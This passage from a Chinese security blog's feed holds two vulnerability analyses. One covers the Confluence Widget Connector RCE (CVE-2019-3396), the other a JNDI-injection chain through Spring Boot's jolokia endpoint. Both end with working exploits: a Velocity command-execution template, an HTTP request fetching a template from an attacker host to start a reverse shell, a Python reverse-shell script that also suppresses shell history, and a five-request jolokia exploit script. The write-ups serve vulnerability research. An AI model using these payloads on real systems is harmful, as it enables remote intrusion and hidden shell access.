src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548780354941.jpg" alt=""></p><p>这里会遍历<code>this.resourceLoaders</code>里面的资源加载器，然后利用可控的资源名以及<code>resourceType</code>为1的参数去初始化一个<code>Resource</code>类。我们看一下这里的<code>Resource</code>类的实例化过程，这里我下了个断看了一下调用的是那个<code>ResourceFactory</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548786002668.jpg" alt=""></p><p>注意到是<code>ConfluenceResourceFactory</code>，这里跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548786979505.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548787133839.jpg" alt=""></p><p>也就是说<code>Resource</code>的具体初始化过程为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548787681198.jpg" alt=""></p><p><code>ConfluenceVelocityTemplateImpl</code>是<code>Template</code>类的一个子类，也就是说之后的过程就是加载模版，解析模版的过程。所以我们来看一下这里的<code>resourceLoaders</code>中的资源加载器是什么：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548792276385.jpg" alt=""></p><ul><li>com.atlassian.confluence.setup.velocity.HibernateResourceLoader</li><li>org.apache.velocity.runtime.resource.loader.FileResourceLoader</li><li>org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader</li><li>com.atlassian.confluence.setup.velocity.DynamicPluginResourceLoader</li></ul><p>在以上四个资源加载器中，<code>HibernateResourceLoader</code>是ORM资源加载器，<code>DynamicPluginResourceLoader</code>是动态插件资源加载器，这两个和我们的利用都没有什么具体的关系，而<code>FileResourceLoader</code>可以读取文件，<code>ClasspathResourceLoader</code>可以加载文件。RCE的点也在于<code>ClasspathResourceLoader</code>中。</p><p>具体跟一下<code>ClasspathResourceLoader#getResourceStream</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15553105578853.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15553106081075.jpg" alt=""></p><p>这里在<code>ClassUtils#getResourceAsStream</code>中的处理过程非常有意思，有意思的点在于这里完成了两个操作（以下分析为个人理解，如果有问题希望各位斧正）：</p><ul><li>osgi对于类加载的跟踪与检查</li><li>tomcat基于双亲委派模型的类加载架构</li></ul><p>当Java虚拟机要加载一个类时，会进行如下的步骤：</p><ul><li>首先当前线程的类加载器去加载线程中的第一个类（假设为类A）注：（当前线程的类加载器可以通过Thread类的getContextClassLoader()获得，也可以通过setContextClassLoader()自己设置类加载器）</li><li>如果类A中引用了类B，Java虚拟机将使用加载类A的类加载器去加载类B</li><li>还可以直接调用ClassLoader.loadClass()方法来指定某个类加载器去加载某个类</li></ul><p>而在进行第一步时首先会尝试用<code>BundleDelegatingClassLoader</code>来进行类加载：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15553162199554.jpg" alt=""></p><p>这里的<code>BundleDelegatingClassLoader</code>是osgi自己的类加载器，主要用于进行类加载的跟踪，这里主要用于在osgi中寻找相关的依赖类，如果找不到的话，再以tomcat实现的双亲委派模型从上至下进行加载。</p><h2 id="3-2-Tomcat类加载"><a href="#3-2-Tomcat类加载" class="headerlink" title="3.2 Tomcat类加载"></a>3.2 Tomcat类加载</h2><p>ok，这里比较麻烦的一个问题已经解决，我们所知这里所用的<code>classLoader</code>最终为<code>ClasspathResourceLoader</code>，而<code>ClasspathResourceLoader</code>是继承于<code>ResourceLoader</code>的，那么<code>ResourceLoader</code>的上层是什么呢，这个时候就要看tomcat的类加载架构了：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15553180539245.jpg" alt=""></p><p><code>WebappClassLoader</code>加载<code>WEB-INF/*</code>中的类库，所以这里是转交到<code>WebappClassLoader</code>来进行处理的，在动态调试过程中我们也可以清晰的看到这个过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15553199605029.jpg" alt=""></p><p>这里要注意两点：</p><ul><li><code>ClasspathResourceLoader</code>上层为<code>WebappClassLoader</code></li><li>javase的类加载器为<code>ExtClassLoader</code>且ucp为<code>URLClassPath</code></li></ul><p>在<code>WebappClassLoader</code>中其具体操作是转交由父类<code>WebappClassLoaderBase</code>来进行处理的，这里只截关键的处理点：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15553846372639.jpg" alt=""></p><p>我们可以看到这里是根据<code>name</code>也就是我们传入的<code>_template</code>来实例化一个URL类的<code>url</code>，我们来跟一下看看这个<code>url</code>的实例化流程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15553853492406.jpg" alt=""></p><p>这里调用了<code>super.findResource</code>来进行处理，跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15553863145909.jpg" alt=""></p><p>这里调用了<code>java.net.URLClassLoader#findResource</code>在URL搜索路径中查找指定名称的资源，可以看到这里会执行<code>upc.findResource</code>，即<code>URLClassPath.findResource</code>。这里会在URL搜索路径中查找具有指定名称的资源，如果找到相应的资源，则调用<code>check</code>方法进行权限检查，并加载相应的资源：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15553971241708.jpg" alt=""></p><p>这里有两种形式加载资源分别是通过读文件（file协议），或者通过相应的协议去访问相应的jar包（jar协议）。</p><p>回过头来继续跟<code>URLClassPath.findResource</code>的处理过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15553991355549.jpg" alt=""></p><p>这里非常好理解，首先通过传入的var1字段在已加载的ClassLoader缓存中进行查找，如果找到相应的加载器，则返回这个加载器的数组，若没找到则返回null：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15554002837531.jpg" alt=""></p><p>之后遍历这个加载器数组，调用每个加载器的<code>findResource</code>方法，通过var1字段寻找相应的资源。在这里可以看到加载器数组中只存在一个加载器<code>URLClassPath$Loader</code>，我们跟进看一下这个加载器的实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15554008311234.jpg" alt=""></p><p>可以明显看到向<code>this.base</code>发送了请求，获取了一个资源，我们看一下这个<code>this.base</code>是什么：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15554024367105.jpg" alt=""></p><p>可以看到这里是向<code>felix.extensions.ExtensionManager</code>发送了请求，felix是一个osgi框架，也就是说我们现在需要跟进到osgi中，我们来看一下处理这个osgi请求的是什么：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15554026309829.jpg" alt=""></p><p>我们跟进<code>org.apache.felix.framework.URLHandlerStreamHandlerProxy#openConnection</code>中看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15554032379732.jpg" alt=""></p><p>可以看到致此完成了请求的发送。以上我们就完成整条rce利用链的分析。</p><h2 id="3-3-6-6-x-6-9-x与6-14-1的区别"><a href="#3-3-6-6-x-6-9-x与6-14-1的区别" class="headerlink" title="3.3 6.6.x-6.9.x与6.14.1的区别"></a>3.3 6.6.x-6.9.x与6.14.1的区别</h2><p>当我们分析完rce的流程并成功弹出计算器后，整个漏洞就已经分析完了么？并没有。</p><p>以上的分析都是在confluence 6.6.11版本上进行的，但不幸的是我最初分析的版本是confluence 6.14.1版本，利用<code>file</code>协议任意读文件的poc我并没有执行成功，我只能利用相对路径来读取当前目录的文件，这不禁激发了我的探索欲，我想知道为啥较高版本就没有办法rce了。</p><p>在我进行调试后，我发现了<code>ClasspathResourceLoader</code>在向上找父类时获得的父类并不是<code>WebappClassLoader</code>而是<code>ParalleWebappClassLoader</code>，导致最终在<code>URLClassPath#findResource</code>时，其并未调用<code>URLClassPath$Loader</code>的<code>findResource</code>，而是调用的<code>URLClassPath$JarLoader</code>的<code>findResource</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15554078099433.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15554080826784.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15554082084383.jpg" alt=""></p><p>这里返回的肯定是null，并不会向外发送请求并获取资源。可以说这个问题的关键点就在于<code>WebappClassLoader</code>与<code>ParalleWebappClassLoader</code>中的upc的类型不同，那为什么会在代码相同的情况下，会造成加载偏差呢？<strong>关键点在于6.14.1是使用的tomcat9，而6.6.x-6.9.x使用的是tomcat8。不同tomcat版本的区别在于其默认的loader是不同的：</strong></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15554135927918.jpg" alt="-w1188"></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15554136365503.jpg" alt="-w1188"></p><p>在tomcat9中默认的loader是<code>ParalleWebappClassLoader</code>，在tomcat8中则是<code>WebappClassLoader</code>，关于其upc为什么不同，这一点我推荐各位看一下<a href="https://www.jianshu.com/p/69c4526b843d" target="_blank" rel="noopener">这篇文章</a>。</p><h1 id="0x04-构造POC"><a href="#0x04-构造POC" class="headerlink" title="0x04 构造POC"></a>0x04 构造POC</h1><p>这里其实改一下poc就好，正常的写Velocity的语法就好，下面执行命令的poc引用<a href="https://github.com/jas502n/CVE-2019-3396" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-3396</a>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set ($exp=&quot;exp&quot;)</span><br><span class="line">#set ($a=$exp.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($command))</span><br><span class="line">#set ($input=$exp.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))</span><br><span class="line">#set($sc = $exp.getClass().forName(&quot;java.util.Scanner&quot;))</span><br><span class="line">#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName(&quot;java.io.InputStream&quot;)))</span><br><span class="line">#set($scan=$constructor.newInstance($input).useDelimiter(&quot;\\A&quot;))</span><br><span class="line">#if($scan.hasNext())</span><br><span class="line">    $scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>反弹shell的:</p><blockquote><p>请求</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: 10.10.20.181</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/plain, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://10.10.20.181/</span><br><span class="line">Content-Length: 232</span><br><span class="line">X-Forwarded-For: 127.0.0.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;1&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.viddler.com/v/test&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;ftp://10.10.20.166:8888/r.vm&quot;,&quot;command&quot;:&quot;setsid python /tmp/nc.py 10.10.20.166 8989&quot;&#125;,&quot;body&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>nc.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">back connect py version,only linux have pty module</span></span><br><span class="line"><span class="string">code by google security team</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> sys,os,socket,pty</span><br><span class="line">shell = <span class="string">"/bin/sh"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'python reverse connector'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'usage: %s &lt;ip_addr&gt; &lt;port&gt;'</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) !=<span class="number">3</span>:</span><br><span class="line">        usage(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit()</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>])))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'connect ok'</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'connect faild'</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">global</span> shell</span><br><span class="line">    os.unsetenv(<span class="string">"HISTFILE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTFILESIZE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTSIZE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTORY"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTSAVE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTZONE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTLOG"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTCMD"</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTFILE"</span>,<span class="string">'/dev/null'</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTSIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTFILESIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">    pty.spawn(shell)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15554139341163.jpg" alt="-w1436"></p><h1 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h1><ul><li><a href="https://confluence.atlassian.com/confcloud/widget-connector-macro-724765314.html" target="_blank" rel="noopener">https://confluence.atlassian.com/confcloud/widget-connector-macro-724765314.html</a></li><li><a href="https://github.com/jas502n/CVE-2019-3396" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-3396</a></li><li><a href="https://paper.seebug.org/884/" target="_blank" rel="noopener">https://paper.seebug.org/884/</a></li><li><a href="https://www.jianshu.com/p/69c4526b843d" target="_blank" rel="noopener">https://www.jianshu.com/p/69c4526b843d</a></li><li><a href="https://tomcat.apache.org/tomcat-9.0-doc/config/loader.html" target="_blank" rel="noopener">https://tomcat.apache.org/tomcat-9.0-doc/config/loader.html</a></li><li><a href="https://tomcat.apache.org/tomcat-8.0-doc/config/loader.html" target="_blank" rel="noopener">https://tomcat.apache.org/tomcat-8.0-doc/config/loader.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个漏洞本来是上周一就分析完了，但是高版本无法造成rce这个问题着实困扰了我很久，在得出了一定的结论后才写完了这篇文章。总体来说，这个漏洞真的是值得好好跟一下，好好研究一下的，能学到很多东西。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Confluence" scheme="https://lucifaer.com/tags/Confluence/"/>
    
  </entry>
  
  <entry>
    <title>Attack Spring Boot Actuator via jolokia Part 2</title>
    <link href="https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/"/>
    <id>https://lucifaer.com/2019/03/13/Attack Spring Boot Actuator via jolokia Part 2/</id>
    <published>2019-03-13T10:57:00.000Z</published>
    <updated>2019-03-13T10:57:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文接<a href="https://www.lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/" target="_blank" rel="noopener">上文</a>，这里不会分析原文章中所说的<code>/env</code>这种利用的方法，而是说一下rr大佬的发现的另外一条利用链。</p><a id="more"></a><h1 id="0x01-检查MBean"><a href="#0x01-检查MBean" class="headerlink" title="0x01 检查MBean"></a>0x01 检查MBean</h1><p>如果说不存在<code>ch.qos.logback.classic reloadByURL</code>这个MBean，还能不能造成RCE呢，这个是我在看完文章后的一个想法。如果说想要解决这个问题，我们需要再看看<code>/jolokia/list</code>中还有哪些利用链可用（真的是太多了T T，由于当时看完记得是在Spring Boot中内嵌的Tomcat中，所以直接看的这个类，然而这个类差点也看跪了T T）。</p><p>最终找到<code>org.apache.catalina.mbeans.MBeanFactory</code>这个可能能造成JNDI注入的类，其中有以下这么几个方法从注释的描述中感觉是可以造成JNDI注入的：</p><ul><li>createUserDatabaseRealm</li><li>createDataSourceRealm</li><li>createJNDIRealm</li></ul><p>这几点中只有最后的<code>createJNDIRealm</code>是可用的，但是他们前面的处理流程都是一样的，接下来就将他们前面的处理流程简单的分析一下，并说明为什么只有<code>createJNDIRealm</code>是可用的。</p><h1 id="0x02-Realm创建流程分析"><a href="#0x02-Realm创建流程分析" class="headerlink" title="0x02 Realm创建流程分析"></a>0x02 Realm创建流程分析</h1><p>Realm是一个MVCC数据库，而MVCC是用于解决多版本并发问题的一个方法。有关Realm的一些具体介绍可以参考<a href="https://infoq.cn/article/introduce-and-common-problems-of-java-realm-principle" target="_blank" rel="noopener">这篇文章</a>。而我自己的理解是就是它给每一个连接的线程建立了一个“快照”，当两个请求同时到达一个线程时，程序不会造成阻塞，而是会在这个“快照”（也是一个线程）中进行操作，当执行完成后，阻塞合并更改（有点像git）：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524594370154.jpg" alt=""></p><p>然而Realm的原理跟我们主要要说的关系不大，tomcat在创建不同的Realm时其实大致的流程都是相同的，只是最后的具体实现不同而已，比如上一节中说道的三个Realm的创建在代码实现流程上是极为相似的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524597728514.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524598003140.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524598293266.jpg" alt=""></p><p>所以我们跟一下红框的部分然后看具体实现就好。</p><p>不难看出关键点在于<code>container.setRealm(realm);</code>，跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524599308045.jpg" alt=""></p><p>如果不存在则创建一个新的realm，这里涉及到<code>Lifecycle</code>的一部分设计与实现，如果想要了解<code>Lifecycle</code>的细节的话，可以参考<a href="https://uule.iteye.com/blog/2340873" target="_blank" rel="noopener">这篇文章</a>。跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524602845599.jpg" alt=""></p><p>看一下这个<code>startInternal</code>的具体实现，发现是一个虚类，那么看一下它的继承关系，找一下它的具体实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524603700935.jpg" alt=""></p><p>可以看到我们所找到这三个Realm的具体实现点了。</p><p>下面说一下为什么<code>createUserDatabaseRealm</code>和<code>createDataSourceRealm</code>不能用。</p><ol><li><p><code>createUserDatabaseRealm</code></p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524609882924.jpg" alt=""></p><p> 乍一看<code>resourceName</code>可控，好像可以JNDI注入，然后发现<code>getGlobalNamingContext()</code>返回的是一个null：<br> <img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524612274679.jpg" alt=""></p><p> 所以无法利用。</p></li><li><p><code>createDataSourceRealm</code></p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524613635835.jpg" alt=""></p><p> 好像并不可以利用。</p></li></ol><h1 id="0x03-createJNDIRealm的利用分析"><a href="#0x03-createJNDIRealm的利用分析" class="headerlink" title="0x03 createJNDIRealm的利用分析"></a>0x03 createJNDIRealm的利用分析</h1><p>那么再来看看<code>createJNDIRealm</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524621841028.jpg" alt=""></p><p>这里有两个重要的点，<code>createDirContext()</code>用env来创建一个<code>InitialDirContext</code>，另一个点是<code>Context.*</code>的配置我们可以控。</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524622183426.jpg" alt=""></p><p>那么具体的JNDI触发点在哪里呢？我们需要着重跟一下<code>createDirContext</code>。</p><p>首先<code>createDirContext</code>最后返回一个<code>InitialDirContext</code>对象，而这个对象是根据env来生成的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524690909944.jpg" alt=""></p><p>跟进，发现这个<code>InitialDirContext</code>实际上是<code>InitialContext</code>的子类，为什么要着重强调这一点呢？因为JDNI的两个必备要素中就一个要求是：上下文对象是通过InitialContext及其子类实例化的，且他们的lookup()方法允许动态协议切换。</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524691845838.jpg" alt=""></p><p>跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524693086609.jpg" alt=""></p><p><code>myProps</code>通过传入的初始上下文配置经过处理返回完整的上下文环境，可以把它看成env的“完整版”。接着向下跟进：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524696352727.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524696880123.jpg" alt=""></p><p>注意红框部分，我们可以通过设置env中的<code>INITIAL_CONTEXT_FACTORY</code>来控制这里的<code>factory</code>，可以看一下有哪些是我们可以指定的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524697878039.jpg" alt=""></p><p>可以看到我们可以指定<code>com.sun.jndi.rmi.registry</code>，来进行rmi的操作，来看一下具体实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524698748309.jpg" alt=""></p><p>这里的<code>var1</code>还是我们的env，也就是说这里的第一个参数是可控的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524699844960.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524700331051.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524700603297.jpg" alt=""></p><p><code>var0</code>、<code>var1</code>可控，还调用了<code>lookup()</code>，在这里完成了JDNI的注入。</p><h1 id="0x04-构造poc"><a href="#0x04-构造poc" class="headerlink" title="0x04 构造poc"></a>0x04 构造poc</h1><p>梳理一下思路，我们需要做这么几部来完成攻击：</p><ol><li>创建<code>JNDIRealm</code></li><li>通过<code>getDirectoryContextEnvironment()</code>来设置<code>contextFactory</code>为<code>RegistryContextFactory</code>，并将<code>connectionURL</code>设置为自己的N/D服务器</li><li>重启Realm来完成更改并执行（stop、start）</li></ol><p>也就是说需要发4次请求。</p><p>在利用过程中get请求的构造比较麻烦这里用post请求来构造poc，关于post如何解析的可以参考get请求解析的分析流程，这里就不过多描述了。</p><p>poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line">import sys</span><br><span class="line">from pprint import pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[1] + &quot;/jolokia/&quot;</span><br><span class="line">pprint(url)</span><br><span class="line"></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    &quot;mbean&quot;: &quot;Tomcat:type=MBeanFactory&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;createJNDIRealm&quot;,</span><br><span class="line">    &quot;arguments&quot;: [&quot;Tomcat:type=Engine&quot;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;WRITE&quot;,</span><br><span class="line">    &quot;attribute&quot;: &quot;contextFactory&quot;,</span><br><span class="line">    &quot;value&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;WRITE&quot;,</span><br><span class="line">    &quot;attribute&quot;: &quot;connectionURL&quot;,</span><br><span class="line">    &quot;value&quot;: &quot;rmi://localhost:1097/Exploit&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;stop&quot;,</span><br><span class="line">    &quot;arguments&quot;: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start = &#123;</span><br><span class="line">    &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;start&quot;,</span><br><span class="line">    &quot;arguments&quot;: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"></span><br><span class="line">for i in expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/13/15524743021935.jpg" alt=""></p><h1 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h1><ul><li><a href="https://infoq.cn/article/introduce-and-common-problems-of-java-realm-principle" target="_blank" rel="noopener">https://infoq.cn/article/introduce-and-common-problems-of-java-realm-principle</a></li><li><a href="https://uule.iteye.com/blog/2340873" target="_blank" rel="noopener">https://uule.iteye.com/blog/2340873</a></li><li><a href="https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt" target="_blank" rel="noopener">https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt</a></li></ul>]]></content>
    
    <summary type="html">
    
